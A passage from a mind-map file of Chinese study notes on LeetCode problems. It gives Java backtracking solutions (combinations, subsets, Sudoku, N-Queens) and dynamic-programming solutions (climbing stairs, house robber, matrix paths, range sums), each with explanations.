      数组元素可能含有相同的元素，进行排列时就有可能出现重复的排列，要求重复的排列只返回一个。
    </p>
    <p>
      在实现上，和 Permutations 不同的是要先排序，然后在添加一个元素时，判断这个元素是否等于前一个元素，如果等于，并且前一个元素还未访问，那么就跳过这个元素。
    </p>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) {
    List&lt;List&lt;Integer&gt;&gt; permutes = new ArrayList&lt;&gt;();
    List&lt;Integer&gt; permuteList = new ArrayList&lt;&gt;();
    Arrays.sort(nums);  // 排序
    boolean[] hasVisited = new boolean[nums.length];
    backtracking(permuteList, permutes, hasVisited, nums);
    return permutes;
}
private void backtracking(List&lt;Integer&gt; permuteList, List&lt;List&lt;Integer&gt;&gt; permutes, boolean[] visited, final int[] nums) {
    if (permuteList.size() == nums.length) {
        permutes.add(new ArrayList&lt;&gt;(permuteList));
        return;
    }
    for (int i = 0; i &lt; visited.length; i++) {
        if (i != 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !visited[i - 1]) {
            continue;  // 防止重复
        }
        if (visited[i]){
            continue;
        }
        visited[i] = true;
        permuteList.add(nums[i]);
        backtracking(permuteList, permutes, visited, nums);
        permuteList.remove(permuteList.size() - 1);
        visited[i] = false;
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1254378290" CREATED="1754751539655" MODIFIED="1754751539657"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 组合
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      77. Combinations (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/combinations/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/combinations/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">If n = 4 and k = 2, a solution is:
[
  [2,4],
  [3,4],
  [2,3],
  [1,2],
  [1,3],
  [1,4],
]</code></pre>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) {
    List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;();
    List&lt;Integer&gt; combineList = new ArrayList&lt;&gt;();
    backtracking(combineList, combinations, 1, k, n);
    return combinations;
}
private void backtracking(List&lt;Integer&gt; combineList, List&lt;List&lt;Integer&gt;&gt; combinations, int start, int k, final int n) {
    if (k == 0) {
        combinations.add(new ArrayList&lt;&gt;(combineList));
        return;
    }
    for (int i = start; i &lt;= n - k + 1; i++) {  // 剪枝
        combineList.add(i);
        backtracking(combineList, combinations, i + 1, k - 1, n);
        combineList.remove(combineList.size() - 1);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_684643009" CREATED="1754751539658" MODIFIED="1754751539659"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 组合求和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      39. Combination Sum (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/combination-sum/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/combination-sum/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">given candidate set [2, 3, 6, 7] and target 7,
A solution set is:
[[7],[2, 2, 3]]</code></pre>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) {
    List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;();
    backtracking(new ArrayList&lt;&gt;(), combinations, 0, target, candidates);
    return combinations;
}
private void backtracking(List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations,
                          int start, int target, final int[] candidates) {
    if (target == 0) {
        combinations.add(new ArrayList&lt;&gt;(tempCombination));
        return;
    }
    for (int i = start; i &lt; candidates.length; i++) {
        if (candidates[i] &lt;= target) {
            tempCombination.add(candidates[i]);
            backtracking(tempCombination, combinations, i, target - candidates[i], candidates);
            tempCombination.remove(tempCombination.size() - 1);
        }
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_876473191" CREATED="1754751539660" MODIFIED="1754751539662"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 含有相同元素的组合求和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      40. Combination Sum II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/combination-sum-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/combination-sum-ii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example, given candidate set [10, 1, 2, 7, 6, 1, 5] and target 8,
A solution set is:
[
  [1, 7],
  [1, 2, 5],
  [2, 6],
  [1, 1, 6]
]</code></pre>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; combinationSum2(int[] candidates, int target) {
    List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;();
    Arrays.sort(candidates);
    backtracking(new ArrayList&lt;&gt;(), combinations, new boolean[candidates.length], 0, target, candidates);
    return combinations;
}
private void backtracking(List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations,
                          boolean[] hasVisited, int start, int target, final int[] candidates) {
    if (target == 0) {
        combinations.add(new ArrayList&lt;&gt;(tempCombination));
        return;
    }
    for (int i = start; i &lt; candidates.length; i++) {
        if (i != 0 &amp;&amp; candidates[i] == candidates[i - 1] &amp;&amp; !hasVisited[i - 1]) {
            continue;
        }
        if (candidates[i] &lt;= target) {
            tempCombination.add(candidates[i]);
            hasVisited[i] = true;
            backtracking(tempCombination, combinations, hasVisited, i + 1, target - candidates[i], candidates);
            hasVisited[i] = false;
            tempCombination.remove(tempCombination.size() - 1);
        }
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_865409202" CREATED="1754751539662" MODIFIED="1754751539664"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 1-9 数字的组合求和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      216. Combination Sum III (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/combination-sum-iii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/combination-sum-iii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: k = 3, n = 9
Output:
[[1,2,6], [1,3,5], [2,3,4]]</code></pre>
    <p>
      从 1-9 数字中选出 k 个数不重复的数，使得它们的和为 n。
    </p>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; combinationSum3(int k, int n) {
    List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;();
    List&lt;Integer&gt; path = new ArrayList&lt;&gt;();
    backtracking(k, n, 1, path, combinations);
    return combinations;
}
private void backtracking(int k, int n, int start,
                          List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations) {
    if (k == 0 &amp;&amp; n == 0) {
        combinations.add(new ArrayList&lt;&gt;(tempCombination));
        return;
    }
    if (k == 0 || n == 0) {
        return;
    }
    for (int i = start; i &lt;= 9; i++) {
        tempCombination.add(i);
        backtracking(k - 1, n - i, i + 1, tempCombination, combinations);
        tempCombination.remove(tempCombination.size() - 1);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1807845122" CREATED="1754751539665" MODIFIED="1754751539667"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      11. 子集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      78. Subsets (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/subsets/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/subsets/description/">力扣</a>
    </p>
    <p>
      找出集合的所有子集，子集不能重复，[1, 2] 和 [2, 1] 这种子集算重复
    </p>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) {
    List&lt;List&lt;Integer&gt;&gt; subsets = new ArrayList&lt;&gt;();
    List&lt;Integer&gt; tempSubset = new ArrayList&lt;&gt;();
    for (int size = 0; size &lt;= nums.length; size++) {
        backtracking(0, tempSubset, subsets, size, nums); // 不同的子集大小
    }
    return subsets;
}
private void backtracking(int start, List&lt;Integer&gt; tempSubset, List&lt;List&lt;Integer&gt;&gt; subsets,
                          final int size, final int[] nums) {
    if (tempSubset.size() == size) {
        subsets.add(new ArrayList&lt;&gt;(tempSubset));
        return;
    }
    for (int i = start; i &lt; nums.length; i++) {
        tempSubset.add(nums[i]);
        backtracking(i + 1, tempSubset, subsets, size, nums);
        tempSubset.remove(tempSubset.size() - 1);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_486875040" CREATED="1754751539667" MODIFIED="1754751539669"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      12. 含有相同元素求子集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      90. Subsets II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/subsets-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/subsets-ii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example,
If nums = [1,2,2], a solution is:
[
  [2],
  [1],
  [1,2,2],
  [2,2],
  [1,2],
  []
]</code></pre>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) {
    Arrays.sort(nums);
    List&lt;List&lt;Integer&gt;&gt; subsets = new ArrayList&lt;&gt;();
    List&lt;Integer&gt; tempSubset = new ArrayList&lt;&gt;();
    boolean[] hasVisited = new boolean[nums.length];
    for (int size = 0; size &lt;= nums.length; size++) {
        backtracking(0, tempSubset, subsets, hasVisited, size, nums); // 不同的子集大小
    }
    return subsets;
}
private void backtracking(int start, List&lt;Integer&gt; tempSubset, List&lt;List&lt;Integer&gt;&gt; subsets, boolean[] hasVisited,
                          final int size, final int[] nums) {
    if (tempSubset.size() == size) {
        subsets.add(new ArrayList&lt;&gt;(tempSubset));
        return;
    }
    for (int i = start; i &lt; nums.length; i++) {
        if (i != 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !hasVisited[i - 1]) {
            continue;
        }
        tempSubset.add(nums[i]);
        hasVisited[i] = true;
        backtracking(i + 1, tempSubset, subsets, hasVisited, size, nums);
        hasVisited[i] = false;
        tempSubset.remove(tempSubset.size() - 1);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_797487753" CREATED="1754751539669" MODIFIED="1754751539672"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      13. 分割字符串使得每个部分都是回文数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      131. Palindrome Partitioning (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/palindrome-partitioning/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/palindrome-partitioning/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example, given s = &quot;aab&quot;,
Return
[
  [&quot;aa&quot;,&quot;b&quot;],
  [&quot;a&quot;,&quot;a&quot;,&quot;b&quot;]
]</code></pre>
    <pre><code class="language-plaintext">public List&lt;List&lt;String&gt;&gt; partition(String s) {
    List&lt;List&lt;String&gt;&gt; partitions = new ArrayList&lt;&gt;();
    List&lt;String&gt; tempPartition = new ArrayList&lt;&gt;();
    doPartition(s, partitions, tempPartition);
    return partitions;
}
private void doPartition(String s, List&lt;List&lt;String&gt;&gt; partitions, List&lt;String&gt; tempPartition) {
    if (s.length() == 0) {
        partitions.add(new ArrayList&lt;&gt;(tempPartition));
        return;
    }
    for (int i = 0; i &lt; s.length(); i++) {
        if (isPalindrome(s, 0, i)) {
            tempPartition.add(s.substring(0, i + 1));
            doPartition(s.substring(i + 1), partitions, tempPartition);
            tempPartition.remove(tempPartition.size() - 1);
        }
    }
}
private boolean isPalindrome(String s, int begin, int end) {
    while (begin &lt; end) {
        if (s.charAt(begin++) != s.charAt(end--)) {
            return false;
        }
    }
    return true;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1554878195" CREATED="1754751539672" MODIFIED="1754751539674"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      14. 数独
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      37. Sudoku Solver (Hard)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sudoku-solver/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sudoku-solver/description/">力扣</a>
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0e8fdc96-83c1-4798-9abe-45fc91d70b9d.png"/>
      
    </p>
    <pre><code class="language-plaintext">private boolean[][] rowsUsed = new boolean[9][10];
private boolean[][] colsUsed = new boolean[9][10];
private boolean[][] cubesUsed = new boolean[9][10];
private char[][] board;
public void solveSudoku(char[][] board) {
    this.board = board;
    for (int i = 0; i &lt; 9; i++)
        for (int j = 0; j &lt; 9; j++) {
            if (board[i][j] == '.') {
                continue;
            }
            int num = board[i][j] - '0';
            rowsUsed[i][num] = true;
            colsUsed[j][num] = true;
            cubesUsed[cubeNum(i, j)][num] = true;
        }
        backtracking(0, 0);
}
private boolean backtracking(int row, int col) {
    while (row &lt; 9 &amp;&amp; board[row][col] != '.') {
        row = col == 8 ? row + 1 : row;
        col = col == 8 ? 0 : col + 1;
    }
    if (row == 9) {
        return true;
    }
    for (int num = 1; num &lt;= 9; num++) {
        if (rowsUsed[row][num] || colsUsed[col][num] || cubesUsed[cubeNum(row, col)][num]) {
            continue;
        }
        rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = true;
        board[row][col] = (char) (num + '0');
        if (backtracking(row, col)) {
            return true;
        }
        board[row][col] = '.';
        rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = false;
    }
    return false;
}
private int cubeNum(int i, int j) {
    int r = i / 3;
    int c = j / 3;
    return r * 3 + c;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_5992709" CREATED="1754751539675" MODIFIED="1754751539677"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      15. N 皇后
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      51. N-Queens (Hard)
    </p>
    <p>
      <a href="https://leetcode.com/problems/n-queens/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/n-queens/description/">力扣</a>
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/067b310c-6877-40fe-9dcf-10654e737485.jpg"/>
      
    </p>
    <p>
      在 n*n 的矩阵中摆放 n 个皇后，并且每个皇后不能在同一行，同一列，同一对角线上，求所有的 n 皇后的解。
    </p>
    <p>
      一行一行地摆放，在确定一行中的那个皇后应该摆在哪一列时，需要用三个标记数组来确定某一列是否合法，这三个标记数组分别为：列标记数组、45 度对角线标记数组和 135 度对角线标记数组。
    </p>
    <p>
      45 度对角线标记数组的长度为 2 * n - 1，通过下图可以明确 (r, c) 的位置所在的数组下标为 r + c。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9c422923-1447-4a3b-a4e1-97e663738187.jpg"/>
      
    </p>
    <p>
      135 度对角线标记数组的长度也是 2 * n - 1，(r, c) 的位置所在的数组下标为 n - 1 - (r - c)。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a85e285-e152-4116-b6dc-3fab27ba9437.jpg"/>
      
    </p>
    <pre><code class="language-plaintext">private List&lt;List&lt;String&gt;&gt; solutions;
private char[][] nQueens;
private boolean[] colUsed;
private boolean[] diagonals45Used;
private boolean[] diagonals135Used;
private int n;
public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) {
    solutions = new ArrayList&lt;&gt;();
    nQueens = new char[n][n];
    for (int i = 0; i &lt; n; i++) {
        Arrays.fill(nQueens[i], '.');
    }
    colUsed = new boolean[n];
    diagonals45Used = new boolean[2 * n - 1];
    diagonals135Used = new boolean[2 * n - 1];
    this.n = n;
    backtracking(0);
    return solutions;
}
private void backtracking(int row) {
    if (row == n) {
        List&lt;String&gt; list = new ArrayList&lt;&gt;();
        for (char[] chars : nQueens) {
            list.add(new String(chars));
        }
        solutions.add(list);
        return;
    }
    for (int col = 0; col &lt; n; col++) {
        int diagonals45Idx = row + col;
        int diagonals135Idx = n - 1 - (row - col);
        if (colUsed[col] || diagonals45Used[diagonals45Idx] || diagonals135Used[diagonals135Idx]) {
            continue;
        }
        nQueens[row][col] = 'Q';
        colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = true;
        backtracking(row + 1);
        colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = false;
        nQueens[row][col] = '.';
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1103101949" CREATED="1754750425403" MODIFIED="1754751539678" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    动态规划
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      递归和动态规划都是将原问题拆成多个子问题然后求解，他们之间最本质的区别是，动态规划保存了子问题的解，避免重复计算。
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_32734429" CREATED="1754751539679" MODIFIED="1754751539679"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      斐波那契数列
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1912890108" CREATED="1754751539681" MODIFIED="1754751539683"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 爬楼梯
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      70. Climbing Stairs (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/climbing-stairs/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/climbing-stairs/description/">力扣</a>
    </p>
    <p>
      题目描述：有 N 阶楼梯，每次可以上一阶或者两阶，求有多少种上楼梯的方法。
    </p>
    <p>
      定义一个数组 dp 存储上楼梯的方法数（为了方便讨论，数组下标从 1 开始），dp[i] 表示走到第 i 个楼梯的方法数目。
    </p>
    <p>
      第 i 个楼梯可以从第 i-1 和 i-2 个楼梯再走一步到达，走到第 i 个楼梯的方法数为走到第 i-1 和第 i-2 个楼梯的方法数之和。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/14fe1e71-8518-458f-a220-116003061a83.png"/>
      
    </p>
    <p>
      考虑到 dp[i] 只与 dp[i - 1] 和 dp[i - 2] 有关，因此可以只用两个变量来存储 dp[i - 1] 和 dp[i - 2]，使得原来的 O(N) 空间复杂度优化为 O(1) 复杂度。
    </p>
    <pre><code class="language-plaintext">public int climbStairs(int n) {
    if (n &lt;= 2) {
        return n;
    }
    int pre2 = 1, pre1 = 2;
    for (int i = 2; i &lt; n; i++) {
        int cur = pre1 + pre2;
        pre2 = pre1;
        pre1 = cur;
    }
    return pre1;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1029608019" CREATED="1754751539683" MODIFIED="1754751539685"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 强盗抢劫
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      198. House Robber (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/house-robber/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/house-robber/description/">力扣</a>
    </p>
    <p>
      题目描述：抢劫一排住户，但是不能抢邻近的住户，求最大抢劫量。
    </p>
    <p>
      定义 dp 数组用来存储最大的抢劫量，其中 dp[i] 表示抢到第 i 个住户时的最大抢劫量。
    </p>
    <p>
      由于不能抢劫邻近住户，如果抢劫了第 i -1 个住户，那么就不能再抢劫第 i 个住户，所以
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2de794ca-aa7b-48f3-a556-a0e2708cb976.jpg"/>
      
    </p>
    <pre><code class="language-plaintext">public int rob(int[] nums) {
    int pre2 = 0, pre1 = 0;
    for (int i = 0; i &lt; nums.length; i++) {
        int cur = Math.max(pre2 + nums[i], pre1);
        pre2 = pre1;
        pre1 = cur;
    }
    return pre1;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_107760276" CREATED="1754751539686" MODIFIED="1754751539688"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 强盗在环形街区抢劫
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      213. House Robber II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/house-robber-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/house-robber-ii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public int rob(int[] nums) {
    if (nums == null || nums.length == 0) {
        return 0;
    }
    int n = nums.length;
    if (n == 1) {
        return nums[0];
    }
    return Math.max(rob(nums, 0, n - 2), rob(nums, 1, n - 1));
}
private int rob(int[] nums, int first, int last) {
    int pre2 = 0, pre1 = 0;
    for (int i = first; i &lt;= last; i++) {
        int cur = Math.max(pre1, pre2 + nums[i]);
        pre2 = pre1;
        pre1 = cur;
    }
    return pre1;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_289802247" CREATED="1754751539688" MODIFIED="1754751539689"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 信件错排
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      题目描述：有 N 个 信 和 信封，它们被打乱，求错误装信方式的数量。
    </p>
    <p>
      定义一个数组 dp 存储错误方式数量，dp[i] 表示前 i 个信和信封的错误方式数量。假设第 i 个信装到第 j 个信封里面，而第 j 个信装到第 k 个信封里面。根据 i 和 k 是否相等，有两种情况：
    </p>
    <ul>
      <li>
        <p>
          i==k，交换 i 和 j 的信后，它们的信和信封在正确的位置，但是其余 i-2 封信有 dp[i-2] 种错误装信的方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-2] 种错误装信方式。
        </p>
      </li>
      <li>
        <p>
          i != k，交换 i 和 j 的信后，第 i 个信和信封在正确的位置，其余 i-1 封信有 dp[i-1] 种错误装信方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-1] 种错误装信方式。
        </p>
      </li>
    </ul>
    <p>
      综上所述，错误装信数量方式数量为：
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/da1f96b9-fd4d-44ca-8925-fb14c5733388.png"/>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1132116276" CREATED="1754751539690" MODIFIED="1754751539692"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 母牛生产
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.md#">程序员代码面试指南-P181</a>
    </p>
    <p>
      题目描述：假设农场中成熟的母牛每年都会生 1 头小母牛，并且永远不会死。第一年有 1 只小母牛，从第二年开始，母牛开始生小母牛。每只小母牛 3 年之后成熟又可以生小母牛。给定整数 N，求 N 年后牛的数量。
    </p>
    <p>
      第 i 年成熟的牛的数量为：
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/879814ee-48b5-4bcb-86f5-dcc400cb81ad.png"/>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1635526755" CREATED="1754751539692" MODIFIED="1754751539692"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      矩阵路径
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_807640635" CREATED="1754751539693" MODIFIED="1754751539695"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 矩阵的最小路径和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      64. Minimum Path Sum (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/minimum-path-sum/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/minimum-path-sum/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">[[1,3,1],
 [1,5,1],
 [4,2,1]]
Given the above grid map, return 7. Because the path 1→3→1→1→1 minimizes the sum.</code></pre>
    <p>
      题目描述：求从矩阵的左上角到右下角的最小路径和，每次只能向右和向下移动。
    </p>
    <pre><code class="language-plaintext">public int minPathSum(int[][] grid) {
    if (grid.length == 0 || grid[0].length == 0) {
        return 0;
    }
    int m = grid.length, n = grid[0].length;
    int[] dp = new int[n];
    for (int i = 0; i &lt; m; i++) {
        for (int j = 0; j &lt; n; j++) {
            if (j == 0) {
                dp[j] = dp[j];        // 只能从上侧走到该位置
            } else if (i == 0) {
                dp[j] = dp[j - 1];    // 只能从左侧走到该位置
            } else {
                dp[j] = Math.min(dp[j - 1], dp[j]);
            }
            dp[j] += grid[i][j];
        }
    }
    return dp[n - 1];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_226523277" CREATED="1754751539695" MODIFIED="1754751539697"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 矩阵的总路径数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      62. Unique Paths (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/unique-paths/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/unique-paths/description/">力扣</a>
    </p>
    <p>
      题目描述：统计从矩阵左上角到右下角的路径总数，每次只能向右或者向下移动。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc82f0f3-c1d4-4ac8-90ac-d5b32a9bd75a.jpg"/>
      
    </p>
    <pre><code class="language-plaintext">public int uniquePaths(int m, int n) {
    int[] dp = new int[n];
    Arrays.fill(dp, 1);
    for (int i = 1; i &lt; m; i++) {
        for (int j = 1; j &lt; n; j++) {
            dp[j] = dp[j] + dp[j - 1];
        }
    }
    return dp[n - 1];
}</code></pre>
    <p>
      也可以直接用数学公式求解，这是一个组合问题。机器人总共移动的次数 S=m+n-2，向下移动的次数 D=m-1，那么问题可以看成从 S 中取出 D 个位置的组合数量，这个问题的解为 C(S, D)。
    </p>
    <pre><code class="language-plaintext">public int uniquePaths(int m, int n) {
    int S = m + n - 2;  // 总共的移动次数
    int D = m - 1;      // 向下的移动次数
    long ret = 1;
    for (int i = 1; i &lt;= D; i++) {
        ret = ret * (S - D + i) / i;
    }
    return (int) ret;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1675086452" CREATED="1754751539697" MODIFIED="1754751539697"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数组区间
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1390584850" CREATED="1754751539700" MODIFIED="1754751539702"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数组区间和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      303. Range Sum Query - Immutable (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/range-sum-query-immutable/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/range-sum-query-immutable/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Given nums = [-2, 0, 3, -5, 2, -1]
sumRange(0, 2) -&gt; 1
sumRange(2, 5) -&gt; -1
sumRange(0, 5) -&gt; -3</code></pre>
    <p>
      求区间 i ~ j 的和，可以转换为 sum[j + 1] - sum[i]，其中 sum[i] 为 0 ~ i - 1 的和。
    </p>
    <pre><code class="language-plaintext">class NumArray {
    private int[] sums;
    public NumArray(int[] nums) {
        sums = new int[nums.length + 1];
        for (int i = 1; i &lt;= nums.length; i++) {
            sums[i] = sums[i - 1] + nums[i - 1];
        }
    }
    public int sumRange(int i, int j) {
        return sums[j + 1] - sums[i];
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
